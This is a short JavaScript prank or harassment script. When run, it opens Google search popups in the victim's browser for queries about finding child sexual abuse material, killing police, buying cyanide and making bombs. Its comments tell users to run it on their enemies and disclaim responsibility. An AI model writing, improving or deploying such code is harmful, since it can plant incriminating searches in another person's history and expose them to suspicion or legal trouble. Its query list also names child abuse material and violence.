//If you run this, you're naughty
//Use this on your enemies
//If something bad happens, NOT MY RESPONSIBILITY DAMN IT! YOU RAN IT!

function searchUp(query){
  var x = window.open();
  if(!x) throw new Error("Error: Popups not allowed bruv");
  x.close();
  window.open("https://www.google.com/search?q=" + query, "", "width=100, height=100");
  var y = window.open();
  y.close();
}
function searchAllUp(queries){
  for(var query of queries){
    try{
      searchUp(query);
    } catch(e){
      console.log("Allow popups (dw wont crash i swear)");
    }
  }
}
searchAllUp([
  "Where to find child porn",
  "How to access YNC underground",
  "Is child porn illegal",
  "How to evade cops",
  "How to kill cops",
  "Where to buy cyanide",
  "How to make a bomb"
]);
// I felt horrible typing that wtf
